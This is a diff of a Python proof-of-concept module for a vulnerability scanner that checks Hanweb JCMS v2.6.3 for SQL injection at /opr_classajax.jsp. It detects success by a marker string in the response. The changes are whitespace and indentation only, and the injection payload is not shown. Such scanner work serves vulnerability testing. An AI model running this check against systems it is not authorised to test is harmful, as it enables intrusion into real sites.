@@ -5,6 +5,7 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 import urllib2
 
+
 class Vuln(ABVuln):
     vuln_id = 'JCMS_0001'  # 平台漏洞编号，留空
     name = '大汉JCMS v2.6.3 /opr_classajax.jsp SQL注入'  # 漏洞名称
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'Hanweb(大汉)'  # 漏洞应用名称
     product_version = '大汉JCMS v2.6.3'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'ad00afaf-8c4f-45ac-9b95-3c10baeb4169'
@@ -42,14 +44,15 @@ class Poc(ABPoc):
             req = urllib2.Request(verify_url)
             content = urllib2.urlopen(req).read()
             if "qzqjqNYcLuHdPHkqkjvq" in content:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
